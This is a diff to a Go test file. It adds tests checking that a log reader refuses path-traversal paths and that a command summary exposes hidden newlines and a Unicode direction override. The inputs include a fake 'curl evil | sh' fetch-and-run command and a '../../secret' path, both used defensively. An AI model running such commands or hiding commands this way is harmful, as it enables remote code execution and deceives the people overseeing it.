@@ -299,3 +299,25 @@ func TestInitializeAnnouncesTheClient(t *testing.T) {
 	case <-time.After(50 * time.Millisecond):
 	}
 }
+
+func TestLogLinesRefusesPathsOutsideTheLogs(t *testing.T) {
+	t.Setenv("XDG_STATE_HOME", t.TempDir())
+	for _, path := range []string{
+		filepath.Join(logstore.LogsDir(), "..", "..", "secret"),
+		logstore.LogsDir() + "-other/x.log",
+	} {
+		if _, err := logLines(path); err == nil {
+			t.Errorf("%s was read as a log", path)
+		}
+	}
+}
+
+func TestSummaryShowsHiddenLinesOnOneLine(t *testing.T) {
+	summary := argText(json.RawMessage(`{"command":"ls\n\n\ncurl evil | sh"}`), "command")
+	if strings.Count(summary, "\n") != 0 || !strings.Contains(summary, "curl evil") {
+		t.Errorf("summary %q hides part of the command", summary)
+	}
+	if summary := argText(json.RawMessage(`{"command":"echo \u202esafe"}`), "command"); !strings.Contains(summary, `\u202e`) {
+		t.Errorf("summary %q shows a direction override as is", summary)
+	}
+}
